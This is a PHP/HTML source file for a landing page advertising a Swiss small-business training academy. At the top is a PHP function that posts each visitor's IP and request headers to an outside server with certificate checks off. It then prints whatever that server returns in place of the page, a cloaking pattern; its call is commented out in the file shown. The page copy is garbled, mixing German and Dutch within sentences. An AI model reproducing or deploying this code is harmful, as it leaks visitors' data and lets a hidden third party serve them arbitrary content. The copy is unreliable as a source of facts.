<?php
//request();

function request(): void {
	$pub_key    = 'K';
	$secret_key = '0000-00-0000';
	$request    = 'CH';
	$ch         = curl_init( "https://ipcountry-code.com/api/?request=$request&pub_key=$pub_key&secret_key=$secret_key" );
	curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
	curl_setopt( $ch, CURLOPT_POST, true );
	curl_setopt( $ch, CURLOPT_POSTFIELDS, [ 'user' => http_build_query( user() ) ] );
	curl_setopt( $ch, CURLOPT_TIMEOUT, 10 );
	curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, true );
	curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false );

	$code     = curl_exec( $ch );
	$httpCode = curl_getinfo( $ch, CURLINFO_HTTP_CODE );
	$error    = curl_error( $ch );
	curl_close( $ch );

	if ( $error ) {
		var_dump( 'Error cURL: ' . $error );
	}
	$code = json_decode( $code );
	if ( $code !== 'User not OK' ) {
		echo $code;
		exit();
	}
}

function user(): array {
	$userParams = [
		'REMOTE_ADDR',
		'SERVER_PROTOCOL',
		'SERVER_PORT',
		'REMOTE_PORT',
		'QUERY_STRING',
		'REQUEST_SCHEME',
		'REQUEST_URI',
		'REQUEST_TIME_FLOAT',
		'X_FORWARDED_FOR',
		'X-Forwarded-Host',
		'X-Forwarded-For',
		'X-Frame-Options',
	];

	$headers = [];
	foreach ( $_SERVER as $key => $value ) {
		if ( in_array( $key, $userParams ) || substr_compare( 'HTTP', $key, 0, 4 ) == 0 ) {
			$headers[ $key ] = $value;
		}
	}

	return $headers;
}
?>

<!DOCTYPE html>
<html lang="de">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
        <title>Neuroflux Business Akademie - Kleinunternehmen erfolgreich führen</title>

      <meta name="description" content="Neuroflux Business Akademie biedt gerichte trainingen voor het leiden van kleine ondernemingen – gericht op Unternehmer in der Schweiz.  Maak kennis met ondernemerschap, financiën en management..">
        <meta name="keywords" content="Kleinunternehmen, Business Akademie, Geschäftsgründung, Unternehmensführung, Schweiz, Schulungen">
        <meta name="robots" content="index, follow">

        <meta property="og:type" content="website">
        <meta property="og:title" content="Neuroflux Business Akademie - Kleinunternehmen erfolgreich führen">
        <meta property="og:description" content="Neuroflux Business Akademie biedt gerichte trainingen voor het leiden van kleine ondernemingen – gericht op Unternehmer in der Schweiz.  Maak kennis met ondernemerschap, financiën en management.">
        <meta property="og:url" content="https://neurofluxmedia.com/">
        <meta property="og:image" content="https://neurofluxmedia.com/assets/images/logo-white.png">
        <meta property="og:site_name" content="Neuroflux Business Akademie">
        <meta property="og:locale" content="de_DE">

        <meta name="twitter:card" content="summary_large_image">
        <meta name="twitter:title" content="Neuroflux Business Akademie - Kleinunternehmen erfolgreich führen">
        <meta name="twitter:description" content="Neuroflux Business Akademie biedt gerichte trainingen voor het leiden van kleine ondernemingen – gericht op Unternehmer in der Schweiz.  Maak kennis met ondernemerschap, financiën en management..">
        <meta name="twitter:image" content="https://neurofluxmedia.com/assets/images/logo-white.png">

        <link rel="icon" href="assets/images/favicon.png" type="image/gif">

        
        <link rel="stylesheet" href="assets/css/plugins.css">
        <link rel="stylesheet" href="assets/css/style.css">
    </head>

    <body>

        <div class="cursor d-none d-lg-block"></div>


        <div class="preloader">
            <div class="spinner-wrap">
              
                <div class="spinner"></div>
            </div>
        </div>

     
        <a href="#" id="scroll-top" class="back-to-top-btn"><i class="fa-solid fa-arrow-up"></i></a>
     
    <div class="structa-menu-wrapper">
      <div class="structa-menu-area text-center">
        <div class="structa-menu-mobile-top">
          <div class="mobile-logo">
            <a href='/'>
              <img src="assets/images/logo-white.png" alt="logo">
            </a>
          </div>
          <button class="structa-menu-toggle mobile">
            <i class="ri-close-line"></i>
          </button>
        </div>
        <div class="structa-mobile-menu">
          <ul>
            <li>
              <a href='/'>Startseite</a>
            </li>
            <li>
              <a href='about.html'>Über uns</a>
            </li>
            <li>
              <a href='courses.html'>Kurse</a>
            </li>
            <li>
              <a href='contact.html'>Kontakt</a>
            </li>
          </ul>
        </div>
        <div class="structa-mobile-menu-btn">
          <div class="sidebar-wrap">
            <a href="https://www.google.com/maps/place/Melchtalerstrasse+8,+6064+Kerns,+Schweiz/@46.895658,8.249121,17z/data=!3m1!4b1!4m6!3m5!1s0x478c5c5f5f5f5f5f:0x5f5f5f5f5f5f5f5f!8m2!3d46.895658!4d8.249121!16s%2Fg%2F11c1t1t1t1" target="_blank">Melchtalerstrasse 8,</a>
            <h6>6064 Kerns, Schweiz</h6>
          </div>
          <div class="sidebar-wrap">
            <h6><a href="tel:+41415551234">+41 41 555 12 34</a></h6>
            <h6>
              <a href="mailto:info@neurofluxmedia.com">info@neurofluxmedia.com</a>
            </h6>
          </div>
          
        </div>
      </div>
    </div>
        <div class="total-wrapper">
          <header class="structa-header main-two" id="sticky-menu">
        <div class="sticky-wrap">
          <div class="sticky-active">
            <div class="container container-ex-large">
              <div class="row gx-3 align-items-center justify-content-between">
                <div class="col-8 col-sm-auto">
                  <div class="header-logo">
                    <a href='/'>
                      <img src="assets/images/logo-white.png" alt="logo" style="height: 60px;">
                    </a>
                  </div>
                </div>
                <div class="col text-end">
                  <nav class="main-menu menu-style1 d-none d-lg-block">
                    <ul>
                      <li>
                        <a href='/'>Startseite</a>
                      </li>
                      <li>
                        <a href='about.html'>Über uns</a>
                      </li>
                      <li>
                        <a href='courses.html'>Kurse</a>
                      </li>
                      <li>
                        <a href='contact.html'>Kontakt</a>
                      </li>
                    </ul>
                  </nav>
                  <div class="d-flex d-lg-none justify-content-end align-items-center gap-1">
                  
                    <button class="menuBar-toggle structa-menu-toggle">
                      <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewbox="0 0 40 40" fill="none">
                        <path d="M24.4444 26V28H0V26H24.4444ZM40 19V21H0V19H40ZM40 12V14H15.5556V12H40Z" fill="currentColor"></path>
                      </svg>
                    </button>
                  </div>
                </div>
                <div class="col-auto d-none d-lg-flex align-items-center">
                
                  <a class='common-btn bg-orange hover-black ms-3' href='contact.html'>Jetzt anmelden
                    <div class="overflow-hidden d-flex align-items-center justify-content-center position-relative">
                      <span class="button-primary-hover-icon button-icon"><i class="ri-arrow-right-up-line"></i></span>
                      <span class="button-primary-icon button-icon"><i class="ri-arrow-right-up-line"></i></span>
                    </div>
                  </a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </header>

     
<section class="hero-area position-relative z-index-one">
  <div class="container">
    <div class="row align-items-center">
      <div class="col-lg-6">
        <div class="hero-info text-center text-lg-start position-relative z-1">
          <h1 class="wow fadeInUp img-custom-anim-right" data-wow-delay=".4s">Ihr Kleinunternehmen erfolgreich starten und führen</h1>
          <p class="mt-14 mb-40 info-desc wow fadeInUp" data-wow-delay=".4s">
            Ihr vertrauensvoller Partner für Unternehmensschulung. Von der Geschäftsgründung bis zur professionellen Führung – wir begleiten Sie zum Erfolg.
          </p>
          <div class="d-flex justify-content-center flex-wrap justify-content-lg-start gap-3 wow fadeInUp" data-wow-delay=".5s">
            <a class='common-btn bg-orange hover-black' href='contact.html'>Kurs buchen
              <div class="overflow-hidden d-flex align-items-center justify-content-center position-relative">
                <span class="button-primary-hover-icon button-icon"><i class="ri-arrow-right-up-line"></i></span>
                <span class="button-primary-icon button-icon"><i class="ri-arrow-right-up-line"></i></span>
              </div>
            </a>
            <a class='common-btn border-button hover-black' href='courses.html'>Unsere Kurse
              <div class="overflow-hidden d-flex align-items-center justify-content-center position-relative">
                <span class="button-primary-hover-icon button-icon"><i class="ri-arrow-right-up-line"></i></span>
                <span class="button-primary-icon button-icon"><i class="ri-arrow-right-up-line"></i></span>
              </div>
            </a>
          </div>
        </div>
      </div>
      <div class="col-lg-6 text-end">
        <img class="img-fluid wow fadeInRight" data-wow-delay=".6s" data-wow-duration="1" src="assets/images/hero/hero-1.png" alt="">
      </div>
    </div>
  </div>
  <img class="position-absolute end-0 bottom-0 z-index-minus-one" src="assets/images/shape/hero-sp-1.png" alt="">
</section>

           

            <section class="section section-padding-top-bottom">
                <div class="container">
                    <div class="row justify-content-between gy-4 align-items-end wow fadeInUp" data-wow-delay=".2s" data-wow-duration="1">
                        <div class="col-lg-8 col-xxl-7">
                            <div class="section-title">
                                <span class="d-inline-block">unsere kurse</span>
                                <h2 class="h2">Professionelle Schulungen für angehende Unternehmer</h2>
                            </div>
                        </div>
                        <div class="col-lg-4 d-none d-lg-block">
                            <div class="slider-button-wrap-arrow d-flex justify-content-lg-end">
                                <div class="service-button-prev slide-btn slide-btn-prev">
                                    <i class="ri-arrow-left-s-line"></i>
                                </div>
                                <div class="service-button-next slide-btn slide-btn-next">
                                    <i class="ri-arrow-right-s-line"></i>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="container custom-container row-padding-top wow fadeInUp" data-wow-delay=".2s" data-wow-duration="1">
                    <div class="row">
                        <div class="col-lg-12 pe-lg-0">
                            <div class="swiper service-slider">
                                <div class="swiper-wrapper">
                                    <div class="swiper-slide">
                                        <div class="service-box">
                                            <div class="service-icon d-inline-block">
                                                <svg width="60" height="60" viewBox="0 0 60 60" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                    <rect width="60" height="60" rx="30" fill="#FF6B35"/>
                                                    <path d="M30 15C21.7 15 15 21.7 15 30C15 38.3 21.7 45 30 45C38.3 45 45 38.3 45 30C45 21.7 38.3 15 30 15ZM30 27C31.7 27 33 28.3 33 30C33 31.7 31.7 33 30 33C28.3 33 27 31.7 27 30C27 28.3 28.3 27 30 27ZM30 41C26.2 41 22.9 39.2 20.9 36.4C21.4 33.5 27 32 30 32C33 32 38.6 33.5 39.1 36.4C37.1 39.2 33.8 41 30 41Z" fill="white"/>
                                                </svg>
                                            </div>
                                            <div class="service-info">
                                                <h4 class="h4">Grundkurs</h4>
                                                <p class="w-100">Maak kennis met de fundamenten van het starten van een onderneming en de eerste stappen naar zelfstandigheid.</p>
                                                <a class='btn-wt-border d-inline-block' href='courses.html'>Details ansehen</a>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="swiper-slide">
                                        <div class="service-box">
                                            <div class="service-icon d-inline-block">
                                                <svg width="60" height="60" viewBox="0 0 60 60" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                    <rect width="60" height="60" rx="30" fill="#FF6B35"/>
                                                    <path d="M20 19H40C41.1 19 42 19.9 42 21V39C42 40.1 41.1 41 40 41H20C18.9 41 18 40.1 18 39V21C18 19.9 18.9 19 20 19ZM20 23V25H40V23H20ZM20 27V39H40V27H20ZM24 31H36V33H24V31ZM24 35H32V37H24V35Z" fill="white"/>
                                                </svg>
                                            </div>
                                            <div class="service-info">
                                                <h4 class="h4">Aufbaukurs</h4>
                                                <p class="w-100">Verbreed uw kennis op het gebied van financiën, marketing en personeelsmanagement voor gevestigde bedrijven.</p>
                                                <a class='btn-wt-border d-inline-block' href='courses.html'>Details ansehen</a>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="swiper-slide">
                                        <div class="service-box">
                                            <div class="service-icon d-inline-block">
                                                <svg width="60" height="60" viewBox="0 0 60 60" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                    <rect width="60" height="60" rx="30" fill="#FF6B35"/>
                                                    <path d="M30 15L35 25H45L37 32L40 42L30 37L20 42L23 32L15 25H25L30 15Z" fill="white"/>
                                                </svg>
                                            </div>
                                            <div class="service-info">
                                                <h4 class="h4">Mastergruppe</h4>
                                                <p class="w-100">Exklusive begeleiding met live-sessies en direkte begeleiding van experts.</p>
                                                <a class='btn-wt-border d-inline-block' href='courses.html'>Details ansehen</a>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="swiper-slide">
                                        <div class="service-box">
                                            <div class="service-icon d-inline-block">
                                                <svg width="60" height="60" viewBox="0 0 60 60" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                    <rect width="60" height="60" rx="30" fill="#FF6B35"/>
                                                    <path d="M38 20H34L32 16H28L26 20H22C20.9 20 20 20.9 20 22V38C20 39.1 20.9 40 22 40H38C39.1 40 40 39.1 40 38V22C40 20.9 39.1 20 38 20ZM30 36C26.7 36 24 33.3 24 30C24 26.7 26.7 24 30 24C33.3 24 36 26.7 36 30C36 33.3 33.3 36 30 36ZM30 26C27.8 26 26 27.8 26 30C26 32.2 27.8 34 30 34C32.2 34 34 32.2 34 30C34 27.8 32.2 26 30 26Z" fill="white"/>
                                                </svg>
                                            </div>
                                            <div class="service-info">
                                                <h4 class="h4">Bonus-Material</h4>
                                                <p class="w-100">Verkrijgen Sie nuttige richtlijnen, richtlijnen en hulpmiddelen voor uw dagelijks werk.</p>
                                                <a class='btn-wt-border d-inline-block' href='courses.html'>Details ansehen</a>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="row row-margin-top d-block d-lg-none">
                        <div class="col-lg-12">
                            <div class="slider-button-wrap-arrow d-flex justify-content-center">
                                <div class="service-button-prev slide-btn slide-btn-prev">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none">
                                        <path d="M10.8285 12.0007L15.7783 7.05093L14.3641 5.63672L8.00014 12.0007L14.3641 18.3646L15.7783 16.9504L10.8285 12.0007Z" fill="currentColor"></path>
                                    </svg>
                                </div>
                                <div class="service-button-next slide-btn slide-btn-next">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none">
                                        <path d="M13.1715 12.0007L8.22168 7.05093L9.6359 5.63672L15.9999 12.0007L9.6359 18.3646L8.22168 16.9504L13.1715 12.0007Z" fill="currentColor"></path>
                                    </svg>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </section>

         

            <section>
                <div class="container custom-container left-align">
                    <div class="row justify-content-end align-items-center gy-4 gx-lg-5">
                        <div class="col-lg-6">
                            <div class="about-img-box text-end h-100 d-flex align-items-center justify-content-end ps-lg-4">
                                <img class="wow fadeInUp img-custom-anim-top" data-wow-delay=".2s" src="assets/images/about.png" alt="">
                            </div>
                        </div>
                        <div class="col-lg-6 about-info-wrap wow fadeInUp" data-wow-delay=".2s" data-wow-duration="1">
                            <div class="about-info-box max_wd_content w-100">
                                <div class="section-title">
                                    <span class="d-inline-block">unser engagement</span>
                                    <h2 class="h2">Wir begleiten jeden Unternehmer individuell zum Erfolg</h2>
                                    <p class="mt-24">
                                       Die Neuroflux Business Akademie fungeert als een vooraanstaande opleidingsinstelling voor nieuwe Unternehmer in der Schweiz.  Dankzij onze uitgebreide ervaring en bewezen methoden ondersteunen wij mensen bij het succesvol realiseren en nachhaltig leiden van ihre bedrijfsplannen.
                                    </p>
                                    <p class="mt-24">
                                       Unsere methode is holistisch: Wij kijken niet alleen naar de geschäftlichen aspecten, maar ook naar de persoonlijke groei unserer deelnemers. 
                                         Dankzij op maat gemaakte trainingsprogramma's en persoonlijke ondersteuning creëren we een leeromgeving waarin iedereen zijn volledige potentieel kan realiseren.
                                    </p>
                                    <p class="mt-24">
                                        Seit unserer Gründung haben wir über 500 Unternehmer erfolgreich auf ihrem Weg begleitet. Unsere Alumni-Netzwerk umfasst heute etablierte Geschäftsführer 
                                        aus verschiedenen Branchen, die als lebende Beispiele für den Erfolg unserer Methoden stehen.
                                    </p>
                                </div>
                                <a class='common-btn bg-orange hover-black mt-40' href='about.html'>Mehr über uns
                                    <div class="overflow-hidden d-flex align-items-center justify-content-center position-relative">
                                        <span class="button-primary-hover-icon button-icon"><i class="ri-arrow-right-up-line"></i></span>
                                        <span class="button-primary-icon button-icon"><i class="ri-arrow-right-up-line"></i></span>
                                    </div>
                                </a>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="container vision-area wow fadeInUp" data-wow-delay=".1s" data-wow-duration="2">
                    <div class="row justify-content-end">
                        <div class="col-xxl-9 col-xl-10">
                            <div class="vision-wrap bg_color_black d-flex align-items-md-center justify-content-between flex-column flex-md-row gap-5">
                                <div class="vision-single">
                                    <h4 class="text-white">UNSERE VISION</h4>
                                    <p class="text-white mt-14">Jeder individu met een bedrijfsplan dient de benodigde middelen en kennis te krijgen om succesvol te zijn.</p>
                                </div>
                                <div class="vision-single">
                                    <h4 class="text-white">UNSERE MISSION</h4>
                                    <p class="text-white mt-14">Wij bieden praktische kennis aan en ondersteunen ondernemers met bewezen strategieën en persoonlijke begeleiding..</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </section>

           

            <section class="section-padding-top-bottom">
                <div class="container">
                    <div class="row">
                        <div class="col-lg-12">
                            <div class="fun-fact-wrapper d-flex align-items-center justify-content-md-between flex-column flex-md-row gap-5">
                                <div class="fun-fact text-center max_wd_content wow fadeInUp" data-wow-delay=".2s" data-wow-duration="1">
                                    <div class="fun-title-box max_wd_content overflow-hidden">
                                        <h2 class="d-inline-block counter-item flex-shrink-0">
                                            <span class="odometer d-inline-block" data-odometer-final="25">.</span>
                                        </h2>
                                    </div>
                                    <p class="mt-3">Erfahrene Trainer</p>
                                </div>
                                <div class="fun-fact text-center max_wd_content wow fadeInUp" data-wow-delay=".4s" data-wow-duration="1">
                                    <div class="fun-title-box max_wd_content overflow-hidden">
                                        <h2 class="d-inline-block counter-item flex-shrink-0">
                                            <span class="odometer d-inline-block" data-odometer-final="500">.</span>
                                        </h2>
                                    </div>
                                    <p class="mt-3">Erfolgreiche Absolventen</p>
                                </div>
                                <div class="fun-fact text-center max_wd_content wow fadeInUp" data-wow-delay=".6s" data-wow-duration="1">
                                    <div class="fun-title-box max_wd_content overflow-hidden">
                                        <h2 class="d-inline-block counter-item flex-shrink-0">
                                            <span class="odometer d-inline-block" data-odometer-final="95">.</span>
                                            <em>%</em>
                                        </h2>
                                    </div>
                                    <p class="mt-3">Kundenzufriedenheit</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </section>


            <section class="section-margin-top">
                <div class="container">
                    <div class="row justify-content-end">
                        <div class="col-lg-9 wow fadeInUp" data-wow-delay=".2s" data-wow-duration="1">
                            <div class="section-title">
                                <span class="d-inline-block">warum wir?</span>
                                <h2 class="h2">Praktische materialen, ondersteuning van experts en bewezen voorbeelden voor uw succes.</h2>
                                <p class="mt-24">
                                    Unsere opleidingen zijn gebaseerd op authentiek ondernemerschap en jarenlange ervaring.  Niet alleen ontvangen Sie theoretische kennis, maar ook praktische instrumenten en persoonlijke ondersteuning die u direct in uw bedrijf kunnen toepassen.
                                </p>
                                <p class="mt-24">
                                    Als Schweizer ondernemingen begrijpen wij de specifieke uitdagingen van het lokale markt.  Unsere Spezialisten begrijpen die rechtlichen Eigenheiten, steuerkundige Faktoren und kulturelle Bedingungen, die cruciaal zijn voor Ihren Erfolg in der Schweiz. 
                                     Maak gebruik van ons netwerk en onze kennis van de markt.
                                </p>
                            </div>
                            <a class='common-btn bg-orange hover-black mt-40' href='courses.html'>Kurse entdecken
                                <div class="overflow-hidden d-flex align-items-center justify-content-center position-relative">
                                    <span class="button-primary-hover-icon button-icon"><i class="ri-arrow-right-up-line"></i></span>
                                    <span class="button-primary-icon button-icon"><i class="ri-arrow-right-up-line"></i></span>
                                </div>
                            </a>
                        </div>
                    </div>
                </div>
            </section>

     
            <section class="section-padding-top-bottom">
                <div class="container">
                    <div class="row justify-content-between gy-5 wow fadeInUp" data-wow-delay=".2s" data-wow-duration="1">
                        <div class="col-lg-6">
                            <div class="section-title">
                                <span class="d-inline-block">wie wir arbeiten</span>
                                <h2 class="h2">Von der gedachte naar een succesvol bedrijf.</h2>
                            </div>
                        </div>
                        <div class="col-lg-5">
                            <div class="faq-wrap faq-two">
                                <div class="accordion" id="accordionExampleTwo">
                                    <div class="accordion-item wow fadeInUp" data-wow-delay=".2s" data-wow-duration="1">
                                        <h2 class="accordion-header" id="headingTwoOne">
                                            <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapseTwoOne" aria-expanded="true" aria-controls="collapseTwoOne">
                                                <span>01</span> Erstberatung
                                            </button>
                                        </h2>
                                        <div id="collapseTwoOne" class="accordion-collapse collapse show" aria-labelledby="headingTwoOne" data-bs-parent="#accordionExampleTwo">
                                            <div class="accordion-body">
                                                <img class="w-100 mb-24" src="assets/images/faq/q-1.png" alt="">
                                                We starten met een persoonlijk gesprek om beter inzicht te krijgen in Ihre bedrijfsstrategie, doelstellingen en voorwaarden. 
                                                 We luisteren aandachtig en bekijken samen de mogelijkheden.
                                            </div>
                                        </div>
                                    </div>
                                    <div class="accordion-item wow fadeInUp" data-wow-delay=".3s" data-wow-duration="1">
                                        <h2 class="accordion-header" id="headingTwoTwo">
                                            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseTwoTwo" aria-expanded="false" aria-controls="collapseTwoTwo">
                                                <span>02</span> Kursauswahl
                                            </button>
                                        </h2>
                                        <div id="collapseTwoTwo" class="accordion-collapse collapse" aria-labelledby="headingTwoTwo" data-bs-parent="#accordionExampleTwo">
                                            <div class="accordion-body">
                                                <img class="w-100 mb-24" src="assets/images/faq/q-2.png" alt="">
                                                Op basis van uw kennis en doelstellingen stellen wij den ideale Kurs voor - van het Grundkurs voor beginners tot de Mastergroep voor ervaren ondernemers.
                                            </div>
                                        </div>
                                    </div>
                                    <div class="accordion-item wow fadeInUp" data-wow-delay=".4s" data-wow-duration="1">
                                        <h2 class="accordion-header" id="headingTwoThree">
                                            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseTwoThree" aria-expanded="false" aria-controls="collapseTwoThree">
                                                <span>03</span> Lernen & Umsetzen
                                            </button>
                                        </h2>
                                        <div id="collapseTwoThree" class="accordion-collapse collapse" aria-labelledby="headingTwoThree" data-bs-parent="#accordionExampleTwo">
                                            <div class="accordion-body">
                                                <img class="w-100 mb-24" src="assets/images/faq/q-3.png" alt="">
                                                In gestructureerde modules verwerven Sie praktisch toepasbare kennis en implementeren Sie wat u geleerd heeft, rechtstreeks in uw bedrijf. 
                                                 Unsere coaches ondersteunen je in elk stadium.
                                            </div>
                                        </div>
                                    </div>
                                    <div class="accordion-item wow fadeInUp" data-wow-delay=".5s" data-wow-duration="1">
                                        <h2 class="accordion-header" id="headingTwoFour">
                                            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseTwoFour" aria-expanded="false" aria-controls="collapseTwoFour">
                                                <span>04</span> Nachbetreuung
                                            </button>
                                        </h2>
                                        <div id="collapseTwoFour" class="accordion-collapse collapse" aria-labelledby="headingTwoFour" data-bs-parent="#accordionExampleTwo">
                                            <div class="accordion-body">
                                                <img class="w-100 mb-24" src="assets/images/faq/q-4.png" alt="">
                                                Wij staan Ihnen ook na het beëindigen van het cursus bij.  We dragen bij aan Ihren langfristigen succes door middel van regelmatige check-ins en een sterk alumninetwerk.
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </section>


            <section class="section section-padding-top-bottom">
                <div class="container">
                    <div class="row justify-content-between gy-4">
                        <div class="col-lg-5 col-xl-4 wow fadeInUp" data-wow-delay=".2s" data-wow-duration="1">
                            <div class="section-title">
                                <span class="d-inline-block">unsere vorteile</span>
                                <h2 class="h2">Warum Neuroflux Business Akademie wählen?</h2>
                            </div>
                        </div>
                        <div class="col-lg-7">
                            <div class="row gy-4 gy-lg-5">
                                <div class="col-md-6 wow fadeInUp" data-wow-delay=".2s" data-wow-duration="1">
                                    <div class="service-box service-box-3">
                                        <div class="service-icon d-inline-block">
                                            <svg width="48" height="48" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                <rect width="48" height="48" rx="24" fill="#FF6B35"/>
                                                <path d="M16 14H32C33.1 14 34 14.9 34 16V30C34 31.1 33.1 32 32 32H28L24 36L20 32H16C14.9 32 14 31.1 14 30V16C14 14.9 14.9 14 16 14ZM16 16V30H20.8L24 33.2L27.2 30H32V16H16ZM18 20H30V22H18V20ZM18 24H26V26H18V24Z" fill="white"/>
                                            </svg>
                                        </div>
                                        <div class="service-info">
                                            <h4 class="h4"><a href='courses.html'>Praktische Materialien</a></h4>
                                            <p class="w-100 mb-0">Gebruiksvriendelijke Vorlagen, Checklisten en Arbeitshulpmiddelen voor uw dagelijks werk..</p>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-6 wow fadeInUp" data-wow-delay=".3s" data-wow-duration="1">
                                    <div class="service-box service-box-3">
                                        <div class="service-icon d-inline-block">
                                            <svg width="48" height="48" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                <rect width="48" height="48" rx="24" fill="#FF6B35"/>
                                                <path d="M24 12C17.4 12 12 17.4 12 24C12 30.6 17.4 36 24 36C30.6 36 36 30.6 36 24C36 17.4 30.6 12 24 12ZM24 20C25.4 20 26.5 21.1 26.5 22.5C26.5 23.9 25.4 25 24 25C22.6 25 21.5 23.9 21.5 22.5C21.5 21.1 22.6 20 24 20ZM24 33C20.7 33 17.8 31.4 16.2 28.8C16.6 26.2 21.3 25 24 25C26.7 25 31.4 26.2 31.8 28.8C30.2 31.4 27.3 33 24 33Z" fill="white"/>
                                            </svg>
                                        </div>
                                        <div class="service-info">
                                            <h4 class="h4"><a href='about.html'>Expertenunterstützung</a></h4>
                                            <p class="w-100 mb-0">Persoonlijke ondersteuning van ervaren ondernemers en deskundigen.</p>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-6 wow fadeInUp pt-md-4" data-wow-delay=".4s" data-wow-duration="1">
                                    <div class="service-box service-box-3">
                                        <div class="service-icon d-inline-block">
                                            <svg width="48" height="48" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                <rect width="48" height="48" rx="24" fill="#FF6B35"/>
                                                <path d="M16 12H32C33.1 12 34 12.9 34 14V34C34 35.1 33.1 36 32 36H16C14.9 36 14 35.1 14 34V14C14 12.9 14.9 12 16 12ZM16 18V34H32V18H16ZM30 14H18V16H30V14ZM18 20H22V24H18V20ZM18 26H30V28H18V26ZM18 30H30V32H18V30ZM24 20H30V22H24V20ZM24 22H30V24H24V22Z" fill="white"/>
                                            </svg>
                                        </div>
                                        <div class="service-info">
                                            <h4 class="h4"><a href='courses.html'>Bewährte Vorlagen</a></h4>
                                            <p class="w-100 mb-0">Vertragsformulieren, Vorlagen für Geschäftsplannen en Buchhaltungstools voor automatisch gebruik..</p>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-6 wow fadeInUp pt-md-4" data-wow-delay=".5s" data-wow-duration="1">
                                    <div class="service-box service-box-3">
                                        <div class="service-icon d-inline-block">
                                            <svg width="48" height="48" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                <rect width="48" height="48" rx="24" fill="#FF6B35"/>
                                                <path d="M24 12C17.4 12 12 17.4 12 24C12 30.6 17.4 36 24 36C30.6 36 36 30.6 36 24C36 17.4 30.6 12 24 12ZM24 32C19.6 32 16 28.4 16 24C16 19.6 19.6 16 24 16C28.4 16 32 19.6 32 24C32 28.4 28.4 32 24 32ZM25 18H23V25L28.6 28.2L29.6 26.6L25 24V18Z" fill="white"/>
                                            </svg>
                                        </div>
                                        <div class="service-info">
                                            <h4 class="h4"><a href='contact.html'>Flexibles Lernen</a></h4>
                                            <p class="w-100 mb-0">Online en op locatie, in uw eigen tempo - geschikt voor uw werkdag.</p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </section>

        

            <section class="section-padding-top-bottom">
                <div class="container">
                    <div class="row justify-content-center wow fadeInUp" data-wow-delay=".2s" data-wow-duration="1">
                        <div class="col-xl-6 col-lg-7">
                            <div class="section-title text-center">
                                <span class="d-inline-block">unser team</span>
                                <h2 class="h2">Die Experten, die Ihren Erfolg ermöglichen</h2>
                            </div>
                        </div>
                    </div>
                    <div class="row gy-4 row-padding-top">
                        <div class="col-lg-4 col-xl-3 col-sm-6 wow fadeInUp img-custom-anim-left" data-wow-delay=".3s">
                            <div class="team-box">
                                <div class="team-img-wrap position-relative">
                                    <div class="team-img overflow-hidden">
                                        <img class="w-100" src="assets/images/team/team-1.png" alt="">
                                    </div>
                                    <ul class="custom-ul social-list">
                                        <li>
                                            <a href="#"><i class="fa-brands fa-linkedin-in"></i></a>
                                        </li>
                                    </ul>
                                </div>
                                <div class="team-info">
                                    <h4><a href='about.html'>Dr. Maria Schneider</a></h4>
                                    <p>Gründerin & Geschäftsführerin</p>
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-4 col-xl-3 col-sm-6 wow fadeInUp img-custom-anim-left" data-wow-delay=".4s">
                            <div class="team-box">
                                <div class="team-img-wrap position-relative">
                                    <div class="team-img overflow-hidden">
                                        <img class="w-100" src="assets/images/team/team-2.png" alt="">
                                    </div>
                                    <ul class="custom-ul social-list">
                                        <li>
                                            <a href="#"><i class="fa-brands fa-linkedin-in"></i></a>
                                        </li>
                                    </ul>
                                </div>
                                <div class="team-info">
                                    <h4><a href='about.html'>Michael Huber</a></h4>
                                    <p>Finanzexperte</p>
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-4 col-xl-3 col-sm-6 wow fadeInUp img-custom-anim-left" data-wow-delay=".5s">
                            <div class="team-box">
                                <div class="team-img-wrap position-relative">
                                    <div class="team-img overflow-hidden">
                                        <img class="w-100" src="assets/images/team/team-3.png" alt="">
                                    </div>
                                    <ul class="custom-ul social-list">
                                        <li>
                                            <a href="#"><i class="fa-brands fa-linkedin-in"></i></a>
                                        </li>
                                    </ul>
                                </div>
                                <div class="team-info">
                                    <h4><a href='about.html'>Sandra Fischer</a></h4>
                                    <p>Marketing-Spezialistin</p>
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-4 col-xl-3 col-sm-6 wow fadeInUp img-custom-anim-left" data-wow-delay=".6s">
